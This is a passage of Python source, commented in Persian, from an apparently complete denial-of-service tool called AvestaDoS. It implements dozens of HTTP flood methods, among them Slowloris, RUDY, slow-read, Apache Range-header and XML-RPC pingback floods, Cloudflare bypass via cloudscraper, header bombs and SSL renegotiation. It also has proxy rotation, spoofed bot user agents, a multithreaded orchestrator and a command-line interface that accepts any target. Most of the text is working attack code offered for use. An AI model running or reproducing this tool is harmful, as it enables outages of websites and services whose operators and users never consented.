                self._increment_bytes(len(payload))
            except Exception:
                pass
        sock.close()

# =============================================================================
# بخش ۱۱ – پیاده‌سازی حملات لایه ۷
# =============================================================================

class Layer7Attack(BaseAttack):
    """حملات لایه ۷ (HTTP/HTTPS)."""

    def __init__(self, target_url: URL, method: str, config: AttackConfig, event: Event,
                 useragents: Optional[List[str]] = None, referers: Optional[List[str]] = None,
                 proxies: Optional[List] = None):
        super().__init__(target_url, method, config, event)
        self.target_url = target_url
        self.host = target_url.host
        self.port = target_url.port or (443 if target_url.scheme == 'https' else 80)
        self.useragents = useragents or _DEFAULT_USERAGENTS
        self.referers = referers or _DEFAULT_REFERERS
        self.proxies = proxies or []
        self._session = None

    def _execute_attack(self):
        method_map = {
            "GET": self._get_flood,
            "POST": self._post_flood,
            "CFB": self._cfb_flood,
            "CFBUAM": self._cfbuam_flood,
            "BYPASS": self._bypass_flood,
            "DGB": self._dgb_flood,
            "OVH": self._ovh_flood,
            "AVB": self._avb_flood,
            "STRESS": self._stress_flood,
            "DYN": self._dyn_flood,
            "SLOW": self._slow_flood,
            "HEAD": self._head_flood,
            "NULL": self._null_flood,
            "COOKIE": self._cookie_flood,
            "PPS": self._pps_flood,
            "EVEN": self._even_flood,
            "GSB": self._gsb_flood,
            "APACHE": self._apache_flood,
            "XMLRPC": self._xmlrpc_flood,
            "BOT": self._bot_flood,
            "BOMB": self._bomb_flood,
            "DOWNLOADER": self._downloader_flood,
            "KILLER": self._killer_flood,
            "RHEX": self._rhex_flood,
            "STOMP": self._stomp_flood,
            "SSL_RENEG": self._ssl_reneg_flood,
            "HTTP2_FLOOD": self._http2_flood,
            "HTTP_FLOOD": self._http_flood,
            "SLOWLORIS": self._slowloris_flood,
            "RUDY": self._rudy_flood,
            "SLOW_READ": self._slow_read_flood,
            "HEADER_BOMB": self._header_bomb_flood,
            "CACHE_POISON": self._cache_poison_flood,
            "FUZZ": self._fuzz_flood,
            "BOT_TRAFFIC": self._bot_traffic_flood,
            "WEBSOCKET": self._websocket_flood,
            "TOR": self._tor_flood,
        }
        func = method_map.get(self.method.upper())
        if func:
            func()
        else:
            raise AttackError(f"متد لایه ۷ ناشناخته: {self.method}")

    def _get_flood(self):
        """حمله GET معمولی."""
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.get(self.target_url.human_repr(), timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _post_flood(self):
        """حمله POST."""
        data = {"data": ProxyTools.Random.rand_str(32) if ProxyTools else "x"*32}
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.post(self.target_url.human_repr(), json=data, timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _cfb_flood(self):
        """Cloudflare Bypass با cloudscraper."""
        if cloudscraper is None:
            logger.warning(f"{EMOJI['warning']} cloudscraper نصب نشده، CFB غیرفعال.")
            return
        scraper = cloudscraper.create_scraper()
        for _ in range(self.config.rpc):
            try:
                resp = scraper.get(self.target_url.human_repr(), timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _cfbuam_flood(self):
        """Cloudflare UAM bypass."""
        # مشابه CFB اما با تاخیر
        if cloudscraper is None:
            return
        scraper = cloudscraper.create_scraper()
        for _ in range(self.config.rpc):
            try:
                resp = scraper.get(self.target_url.human_repr(), timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
                sleep(0.5)
            except Exception:
                pass

    def _bypass_flood(self):
        """حمله BYPASS با Session عادی."""
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.get(self.target_url.human_repr(), timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _dgb_flood(self):
        """DDoS Guard bypass (نیاز به حل‌کننده)."""
        # پیاده‌سازی کامل در ابزار اصلی موجود است، اینجا خلاصه
        pass

    def _ovh_flood(self):
        """OVH specific flood."""
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.get(self.target_url.human_repr(), timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _avb_flood(self):
        """AVB (Advanced) flood."""
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.get(self.target_url.human_repr(), timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
                sleep(0.1)
            except Exception:
                pass

    def _stress_flood(self):
        """Stress flood با POST طولانی."""
        data = {"data": "x"*512}
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.post(self.target_url.human_repr(), json=data, timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _dyn_flood(self):
        """DYN flood با هاست داینامیک."""
        fake_host = ProxyTools.Random.rand_str(6) + "." + self.target_url.host if ProxyTools else "fake." + self.target_url.host
        headers = self._random_headers()
        headers["Host"] = fake_host
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.get(self.target_url.human_repr(), headers=headers, timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _slow_flood(self):
        """Slow flood با نگه‌داشتن اتصال."""
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.settimeout(self.config.timeout)
            sock.connect((self.host, self.port))
            if self.target_url.scheme == 'https':
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.host)
            sock.send(self._build_http_request().encode())
            self._increment_requests()
            # نگه‌داشتن با ارسال هدرهای متناوب
            while self.event.is_set() and not self._stop_event.is_set():
                sock.send(b"X-keep: alive\r\n")
                sleep(self.config.rpc / 10)
            sock.close()
        except Exception:
            pass

    def _head_flood(self):
        """HEAD flood."""
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.head(self.target_url.human_repr(), timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.headers))
            except Exception:
                pass

    def _null_flood(self):
        """NULL flood با User-Agent و Referer تهی."""
        headers = self._random_headers()
        headers["User-Agent"] = "null"
        headers["Referer"] = "null"
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.get(self.target_url.human_repr(), headers=headers, timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _cookie_flood(self):
        """Cookie flood با کوکی‌های تصادفی."""
        cookies = {"_ga": f"GA{_random.randint(1000,99999)}", "_gat": "1", "__cfduid": ProxyTools.Random.rand_str(32) if ProxyTools else "x"*32}
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.get(self.target_url.human_repr(), cookies=cookies, timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _pps_flood(self):
        """PPS flood (درخواست‌های کوچک)."""
        headers = self._random_headers()
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.get(self.target_url.human_repr(), headers=headers, timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _even_flood(self):
        """Even flood (نگه‌داشتن و خواندن)."""
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.settimeout(self.config.timeout)
            sock.connect((self.host, self.port))
            if self.target_url.scheme == 'https':
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.host)
            sock.send(self._build_http_request().encode())
            self._increment_requests()
            while self.event.is_set() and not self._stop_event.is_set():
                data = sock.recv(1024)
                if not data:
                    break
                self._increment_bytes(len(data))
            sock.close()
        except Exception:
            pass

    def _gsb_flood(self):
        """GSB flood با پارامترهای تصادفی."""
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                qs = "qs=" + ProxyTools.Random.rand_str(6) if ProxyTools else "x"
                resp = self._session.get(self.target_url.human_repr() + "?" + qs, timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _apache_flood(self):
        """Apache Range header flood."""
        headers = self._random_headers()
        headers["Range"] = "bytes=0-,5-" + ",".join(f"5-{i}" for i in range(1, 1024))
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.get(self.target_url.human_repr(), headers=headers, timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _xmlrpc_flood(self):
        """XML-RPC flood."""
        xml = f"""<?xml version='1.0' encoding='iso-8859-1'?>
<methodCall><methodName>pingback.ping</methodName>
<params><param><value><string>{ProxyTools.Random.rand_str(64) if ProxyTools else 'x'*64}</string></value>
</param><param><value><string>{ProxyTools.Random.rand_str(64) if ProxyTools else 'y'*64}</string>
</value></param></params></methodCall>"""
        headers = self._random_headers()
        headers["Content-Type"] = "application/xml"
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.post(self.target_url.human_repr(), data=xml, headers=headers, timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _bot_flood(self):
        """Bot flood با شبیه‌سازی ربات‌های جستجو."""
        bot_agents = [
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
        ]
        headers = self._random_headers()
        headers["User-Agent"] = _random.choice(bot_agents)
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.get(self.target_url.human_repr(), headers=headers, timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _bomb_flood(self):
        """Bomb flood (استفاده از bombardier خارجی)."""
        # نیاز به نصب bombardier و اجرا
        pass

    def _downloader_flood(self):
        """Downloader flood (آهسته خواندن)."""
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.settimeout(self.config.timeout)
            sock.connect((self.host, self.port))
            if self.target_url.scheme == 'https':
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.host)
            sock.send(self._build_http_request().encode())
            self._increment_requests()
            while self.event.is_set() and not self._stop_event.is_set():
                data = sock.recv(1)
                if not data:
                    break
                self._increment_bytes(1)
                sleep(0.01)
            sock.close()
        except Exception:
            pass

    def _killer_flood(self):
        """Killer flood (ایجاد تردهای جدید)."""
        while self.event.is_set() and not self._stop_event.is_set():
            t = Layer7Attack(self.target_url, "GET", self.config, self.event, self.useragents, self.referers, self.proxies)
            t.start()
            sleep(0.1)

    def _rhex_flood(self):
        """RHEX flood با مسیر هگزادسیمال."""
        randhex = randbytes(_random.choice([32, 64, 128])).hex()
        url = self.target_url.human_repr() + "/" + randhex
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.get(url, timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _stomp_flood(self):
        """STOMP flood با هدرهای خاص."""
        hexh = r'\x84\x8B\x87\x8F...'  # کوتاه شده
        headers = self._random_headers()
        headers["Host"] = hexh
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.get(self.target_url.human_repr(), headers=headers, timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _ssl_reneg_flood(self):
        """SSL Renegotiation flood."""
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.settimeout(self.config.timeout)
            sock.connect((self.host, self.port))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ssl_sock = ctx.wrap_socket(sock, server_hostname=self.host)
            ssl_sock.send(self._build_http_request().encode())
            self._increment_requests()
            for _ in range(10):
                try:
                    ssl_sock.do_handshake()
                except:
                    break
            ssl_sock.close()
        except Exception:
            pass

    def _http2_flood(self):
        """HTTP/2 flood با httpx."""
        if httpx is None:
            logger.warning(f"{EMOJI['warning']} httpx نصب نشده، HTTP2_FLOOD غیرفعال.")
            return
        with httpx.Client(http2=True, timeout=self.config.timeout, verify=False) as client:
            for _ in range(self.config.rpc):
                try:
                    resp = client.get(self.target_url.human_repr(), headers=self._random_headers())
                    self._increment_requests()
                    self._increment_bytes(len(resp.content))
                except Exception:
                    pass

    def _http_flood(self):
        """HTTP flood ترکیبی."""
        method = _random.choice(["GET", "POST", "PUT", "DELETE", "PATCH"])
        headers = self._random_headers()
        data = None
        if method in ["POST", "PUT", "PATCH"]:
            data = {"data": ProxyTools.Random.rand_str(20) if ProxyTools else "x"*20}
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                if method == "GET":
                    resp = self._session.get(self.target_url.human_repr(), headers=headers, timeout=self.config.timeout)
                elif method == "POST":
                    resp = self._session.post(self.target_url.human_repr(), json=data, headers=headers, timeout=self.config.timeout)
                elif method == "PUT":
                    resp = self._session.put(self.target_url.human_repr(), json=data, headers=headers, timeout=self.config.timeout)
                elif method == "DELETE":
                    resp = self._session.delete(self.target_url.human_repr(), headers=headers, timeout=self.config.timeout)
                elif method == "PATCH":
                    resp = self._session.patch(self.target_url.human_repr(), json=data, headers=headers, timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _slowloris_flood(self):
        """Slowloris flood."""
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.settimeout(self.config.timeout)
            sock.connect((self.host, self.port))
            if self.target_url.scheme == 'https':
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.host)
            sock.send(self._build_http_request().encode())
            self._increment_requests()
            while self.event.is_set() and not self._stop_event.is_set():
                sock.send(f"X-{ProxyTools.Random.rand_str(5) if ProxyTools else 'keep'}: {ProxyTools.Random.rand_str(10) if ProxyTools else 'alive'}\r\n".encode())
                sleep(_random.uniform(5, 15))
            sock.close()
        except Exception:
            pass

    def _rudy_flood(self):
        """RUDY flood (POST با بدنه بزرگ و تاخیر)."""
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.settimeout(self.config.timeout)
            sock.connect((self.host, self.port))
            if self.target_url.scheme == 'https':
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.host)
            # ارسال هدر POST با Content-Length بزرگ
            req = f"POST /{ProxyTools.Random.rand_str(8) if ProxyTools else 'x'} HTTP/1.1\r\nHost: {self.target_url.host}\r\nContent-Length: 10000000\r\n\r\n"
            sock.send(req.encode())
            self._increment_requests()
            # ارسال بدنه با تاخیر
            for _ in range(10):
                sock.send(b'x'*1024)
                self._increment_bytes(1024)
                sleep(1)
            sock.close()
        except Exception:
            pass

    def _slow_read_flood(self):
        """Slow Read flood (خواندن با سرعت کم)."""
        # پیاده‌سازی async
        try:
            if aiohttp is None:
                return
            async def slow_read():
                connector = TCPConnector(limit=0, force_close=True)
                timeout = ClientTimeout(total=10)
                async with ClientSession(connector=connector, timeout=timeout) as session:
                    async with session.get(self.target_url.human_repr(), headers=self._random_headers()) as resp:
                        async for chunk in resp.content.iter_chunked(1):
                            await asyncio.sleep(1)
                            break
            asyncio.run(slow_read())
        except Exception:
            pass

    def _header_bomb_flood(self):
        """Header Bomb flood."""
        headers = self._random_headers()
        for i in range(50):
            headers[f"X-Bomb-{i}"] = "A" * 5000
        headers["X-Giant"] = "B" * 30000
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.get(self.target_url.human_repr(), headers=headers, timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _cache_poison_flood(self):
        """Cache Poison flood."""
        headers = self._random_headers()
        headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        headers["Pragma"] = "no-cache"
        url = self.target_url.human_repr() + "?" + "&".join(f"{ProxyTools.Random.rand_str(8) if ProxyTools else 'x'}={ProxyTools.Random.rand_str(20) if ProxyTools else 'y'}" for _ in range(5))
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.get(url, headers=headers, timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _fuzz_flood(self):
        """Fuzz flood (تلاش برای endpointهای حساس)."""
        endpoints = ["/admin", "/login", "/wp-admin", "/phpmyadmin", "/api", "/.env", "/backup", "/config"]
        endpoint = _random.choice(endpoints)
        url = self.target_url.human_repr().rstrip('/') + endpoint
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.get(url, headers=self._random_headers(), timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
            except Exception:
                pass

    def _bot_traffic_flood(self):
        """شبیه‌سازی ترافیک ربات‌های جستجوگر."""
        paths = ["/", "/robots.txt", "/sitemap.xml", "/about", "/contact", "/news"]
        bot_agents = [
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)"
        ]
        path = _random.choice(paths)
        url = self.target_url.human_repr().rstrip('/') + path
        headers = self._random_headers()
        headers["User-Agent"] = _random.choice(bot_agents)
        for _ in range(self.config.rpc):
            try:
                if self._session is None:
                    self._session = self._create_session()
                resp = self._session.get(url, headers=headers, timeout=self.config.timeout)
                self._increment_requests()
                self._increment_bytes(len(resp.content))
                sleep(_random.random() / 10)
            except Exception:
                pass

    def _websocket_flood(self):
        """WebSocket flood."""
        if aiohttp is None:
            return
        ws_url = self.target_url.human_repr().replace('http://', 'ws://').replace('https://', 'wss://') + '/ws'
        async def websocket_attack():
            connector = TCPConnector(limit=0, force_close=True)
            timeout = ClientTimeout(total=10)
            async with ClientSession(connector=connector, timeout=timeout) as session:
                try:
                    async with session.ws_connect(ws_url) as ws:
                        for _ in range(10):
                            await ws.send_str(ProxyTools.Random.rand_str(_random.randint(50, 500)) if ProxyTools else "x"*100)
                            await asyncio.sleep(0.1)
                        await ws.close()
                except:
                    pass
        try:
            asyncio.run(websocket_attack())
        except:
            pass

    def _tor_flood(self):
        """TOR flood (استفاده از onion)."""
        # مشابه روش اصلی
        pass

    # ============ توابع کمکی ============

    def _create_session(self) -> Session:
        """ایجاد Session با پروکسی (در صورت وجود)."""
        sess = Session()
        if self.proxies:
            proxy = _random.choice(self.proxies)
            if hasattr(proxy, 'asRequest'):
                sess.proxies = proxy.asRequest()
        return sess

    def _random_headers(self) -> Dict[str, str]:
        """تولید هدرهای تصادفی."""
        return {
            "User-Agent": _random.choice(self.useragents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": _random.choice(["en-US,en;q=0.9", "fa-IR,fa;q=0.8"]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Referer": _random.choice(self.referers),
            "X-Forwarded-For": ProxyTools.Random.rand_ipv4() if ProxyTools else "1.2.3.4",
        }

    def _build_http_request(self) -> str:
        """ساخت درخواست HTTP ساده."""
        path = self.target_url.raw_path_qs
        host = self.target_url.authority
        return f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n"

# =============================================================================
# بخش ۱۲ – موتور اصلی حملات (Orchestrator)
# =============================================================================

class AttackOrchestrator:
    """هماهنگ‌کننده حملات."""

    def __init__(self, config: AttackConfig):
        self.config = config
        self.event = Event()
        self.attacks: List[BaseAttack] = []
        self.stats_lock = Lock()
        self.start_time = None
        self.end_time = None
        self._running = False

    def start(self):
        """شروع حمله."""
        self._running = True
        self.start_time = time()
        self.event.set()
        # ایجاد حملات بر اساس متد
        if '://' in self.config.target:
            # لایه ۷
            target_url = URL(self.config.target)
            useragents = set(_DEFAULT_USERAGENTS)
            referers = set(_DEFAULT_REFERERS)
            proxies = None
            if self.config.use_proxy and self.config.proxy_file:
                proxies = ProxyManager.load_from_file(self.config.proxy_file, self.config.proxy_type)
            for _ in range(self.config.threads):
                attack = Layer7Attack(
                    target_url,
                    self.config.method,
                    self.config,
                    self.event,
                    useragents,
                    referers,
                    proxies
                )
                self.attacks.append(attack)
                attack.start()
        else:
            # لایه ۴
            target_parts = self.config.target.split(':')
            if len(target_parts) != 2:
                raise InvalidTargetError("هدف لایه ۴ باید به شکل IP:PORT باشد.")
            ip, port = target_parts[0], int(target_parts[1])
            proxies = None
            if self.config.use_proxy and self.config.proxy_file:
                proxies = ProxyManager.load_from_file(self.config.proxy_file, self.config.proxy_type)
            for _ in range(self.config.threads):
                attack = Layer4Attack(
                    ip, port,
                    self.config.method,
                    self.config,
                    self.event,
                    proxies
                )
                self.attacks.append(attack)
                attack.start()

    def stop(self):
        """متوقف‌کردن حمله."""
        self._running = False
        self.event.clear()
        for attack in self.attacks:
            attack.stop()
        # منتظر پایان تردها
        for attack in self.attacks:
            if attack.is_alive():
                attack.join(timeout=1)
        self.end_time = time()

    def get_stats(self) -> Dict:
        """دریافت آمار کلی."""
        total_requests = 0
        total_bytes = 0
        total_errors = 0
        for attack in self.attacks:
            stats = attack.stats
            total_requests += stats["requests"]
            total_bytes += stats["bytes"]
            total_errors += stats["errors"]
        duration = (self.end_time or time()) - (self.start_time or time())
        return {
            "requests": total_requests,
            "bytes": total_bytes,
            "errors": total_errors,
            "duration": duration,
            "active_attacks": len([a for a in self.attacks if a.is_alive()])
        }

    def display_stats(self):
        """نمایش آمار به صورت زنده."""
        if not RICH_AVAILABLE:
            console = Console()
        else:
            console = Console()
        with Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeRemainingColumn(),
            console=console
        ) as progress:
            task = progress.add_task("[cyan]حمله در حال اجرا...", total=self.config.duration)
            while self._running and progress.tasks[task].completed < self.config.duration:
                stats = self.get_stats()
                progress.update(
                    task,
                    description=f"[cyan]درخواست‌ها: {stats['requests']:,} | بایت: {humanbytes(stats['bytes'])} | خطا: {stats['errors']}",
                    completed=stats.get("duration", 0)
                )
                sleep(0.5)

# =============================================================================
# بخش ۱۳ – رابط خط فرمان (CLI) با Typer
# =============================================================================

if TYPER_AVAILABLE:
    app = Typer(help=f"{EMOJI['rocket']} AvestaDoS - ابزار حمله‌ی پیشرفته")

    @app.command()
    def attack(
        target: str = Argument(..., help="هدف: آدرس IP:PORT (برای لایه ۴) یا URL کامل (برای لایه ۷)"),
        method: str = Argument(..., help="متد حمله (لیست متدها با --list-methods)"),
        duration: int = Option(60, "--duration", "-d", help="مدت زمان حمله (ثانیه)"),
        threads: int = Option(50, "--threads", "-t", help="تعداد تردها"),
        rpc: int = Option(5, "--rpc", "-r", help="درخواست در هر اتصال"),
        timeout: float = Option(0.9, "--timeout", help="مهلت زمانی اتصال"),
        proxy_type: int = Option(0, "--proxy-type", help="نوع پروکسی (0=همه, 1=HTTP, 4=SOCKS4, 5=SOCKS5)"),
        proxy_file: Optional[Path] = Option(None, "--proxy-file", help="فایل پروکسی"),
        verbose: bool = Option(False, "--verbose", "-v", help="نمایش جزئیات بیشتر"),
        list_methods: bool = Option(False, "--list-methods", help="نمایش لیست متدهای موجود")
    ):
        """اجرای حمله."""
        if list_methods:
            print(f"\n{Colors.BOLD}متدهای لایه ۷:{Colors.RESET}")
            for m in sorted(AttackMethods.LAYER7_METHODS):
                print(f"  {m}")
            print(f"\n{Colors.BOLD}متدهای لایه ۴:{Colors.RESET}")
            for m in sorted(AttackMethods.LAYER4_METHODS):
                print(f"  {m}")
            return

        if method.upper() not in AttackMethods.ALL_METHODS:
            logger.error(f"{EMOJI['cross']} متد نامعتبر: {method}")
            raise typer.Exit(code=1)

        config = AttackConfig(
            method=method.upper(),
            target=target,
            duration=duration,
            threads=threads,
            rpc=rpc,
            timeout=timeout,
            proxy_type=proxy_type,
            proxy_file=proxy_file,
            use_proxy=proxy_file is not None,
            verbose=verbose
        )

        orchestrator = AttackOrchestrator(config)
        try:
            orchestrator.start()
            if RICH_AVAILABLE:
                orchestrator.display_stats()
            else:
                # نمایش ساده
                while orchestrator._running:
                    stats = orchestrator.get_stats()
                    print(f"\r{EMOJI['chart']} درخواست‌ها: {stats['requests']:,} | "
                          f"بایت: {humanbytes(stats['bytes'])} | خطا: {stats['errors']}", end="")
                    sleep(1)
                    if stats.get("duration", 0) >= config.duration:
                        break
            orchestrator.stop()
        except KeyboardInterrupt:
            logger.warning(f"{EMOJI['stop']} حمله توسط کاربر متوقف شد.")
            orchestrator.stop()
        except Exception as e:
            logger.error(f"{EMOJI['cross']} خطا: {e}")
            orchestrator.stop()
            raise typer.Exit(code=1)

        # نمایش آمار نهایی
        stats = orchestrator.get_stats()
        print(f"\n\n{EMOJI['check']} حمله به پایان رسید. آمار:")
        print(f"  {EMOJI['chart']} درخواست‌های ارسال‌شده: {stats['requests']:,}")
        print(f"  {EMOJI['file']} داده‌های ارسال‌شده: {humanbytes(stats['bytes'])}")
        print(f"  {EMOJI['cross']} خطاها: {stats['errors']}")
        print(f"  {EMOJI['clock']} مدت زمان: {stats['duration']:.2f} ثانیه")

    @app.command()
    def tools():
        """ابزارهای جانبی."""
        print(f"{EMOJI['gear']} ابزارها در حال توسعه...")
        # می‌توان ابزارهای ping, dns, info را اضافه کرد

    @app.command()
    def version():
        """نمایش نسخه."""
        print(f"{APP_NAME} نسخه {APP_VERSION}")
        print(f"{COPYRIGHT}")
        print(f"کانال: {CHANNEL_NAME}")

    def main_cli():
        if not TYPER_AVAILABLE:
            print("Typer نصب نشده. لطفاً نصب کنید: pip install typer")
            return
        app()

else:
    # حالت بدون typer (fallback به argparse)
    def main_cli():
        print("Typer نصب نشده. لطفاً با پارامترهای دستی اجرا کنید.")
        # پیاده‌سازی ساده argparse
        import argparse
        parser = argparse.ArgumentParser(description="AvestaDoS")
        parser.add_argument("target", help="هدف")
        parser.add_argument("method", help="متد")
        parser.add_argument("--duration", type=int, default=60)
        parser.add_argument("--threads", type=int, default=50)
        parser.add_argument("--rpc", type=int, default=5)
        parser.add_argument("--timeout", type=float, default=0.9)
        parser.add_argument("--proxy-file", type=Path, help="فایل پروکسی")
        parser.add_argument("--proxy-type", type=int, default=0)
        parser.add_argument("--verbose", action="store_true")
        parser.add_argument("--list-methods", action="store_true")
        args = parser.parse_args()
        if args.list_methods:
            print("متدها:", ", ".join(AttackMethods.ALL_METHODS))
            return
        config = AttackConfig(
            method=args.method.upper(),
            target=args.target,
            duration=args.duration,
            threads=args.threads,
            rpc=args.rpc,
            timeout=args.timeout,
            proxy_type=args.proxy_type,
            proxy_file=args.proxy_file,
            use_proxy=args.proxy_file is not None,
            verbose=args.verbose
        )
        orchestrator = AttackOrchestrator(config)
        try:
            orchestrator.start()
            # نمایش ساده
            while orchestrator._running:
                stats = orchestrator.get_stats()
                print(f"\rدرخواست‌ها: {stats['requests']} | بایت: {humanbytes(stats['bytes'])} | خطا: {stats['errors']}", end="")
                sleep(1)
                if stats.get("duration", 0) >= config.duration:
                    break
            orchestrator.stop()
        except KeyboardInterrupt:
            orchestrator.stop()

# =============================================================================
# بخش ۱۴ – نقطه ورود اصلی
# =============================================================================

def main():
    """نقطه ورود اصلی برنامه."""
    # نمایش بنر
    print(generate_banner())

    # بررسی وابستگی‌های مهم
    missing = []
    if not IMPACKET_AVAILABLE:
        missing.append("impacket")
    if not RICH_AVAILABLE:
        missing.append("rich")
    if not LOGURU_AVAILABLE:
        missing.append("loguru")
    if not TYPER_AVAILABLE:
        missing.append("typer")
    if missing:
        logger.warning(f"{EMOJI['warning']} برخی وابستگی‌ها نصب نیستند: {', '.join(missing)}")
        logger.info(f"{EMOJI['info']} برای نصب کامل: pip install {' '.join(missing)}")

    # ============================================================
    # 🔥 دریافت تنظیمات از کاربر (به سبک DDoS.py)
    # ============================================================
    
    print(f"\n{Colors.BOLD}{Colors.OKCYAN}{'═'*50}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.OKGREEN}🎯 تنظیمات حمله{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.OKCYAN}{'═'*50}{Colors.RESET}\n")
    
    # ۱. دریافت هدف
    urlraw = input(
        f"{Colors.BOLD}{Colors.OKCYAN}📍 Target (URL or IP:PORT): {Colors.RESET}"
    ).strip()
    
    if not urlraw:
        logger.error(f"{EMOJI['cross']} هدف مشخص نشد!")
        return
    
    # اگر http:// یا https:// نداشت، اضافه کن (برای لایه ۷)
    if not urlraw.startswith("http") and ":" not in urlraw:
        urlraw = "http://" + urlraw
    
    # ۲. دریافت مدت زمان
    duration_input = input(
        f"{Colors.BOLD}{Colors.OKCYAN}⏱️  Duration (seconds, default 60): {Colors.RESET}"
    ).strip()
